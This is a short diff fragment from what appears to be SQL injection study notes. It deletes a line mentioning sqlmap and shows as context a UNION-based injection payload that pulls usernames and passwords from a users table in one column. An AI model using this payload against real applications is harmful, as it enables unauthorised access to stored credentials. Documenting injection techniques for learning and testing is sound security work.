@@ -65,6 +65,5 @@ Return username and password in single column
 '+UNION+SELECT+null,+username||password+FROM+users--
 ```
 
-ALL THE ABOVE CAN BE ALSO DONE BY SQLMAP
 
 
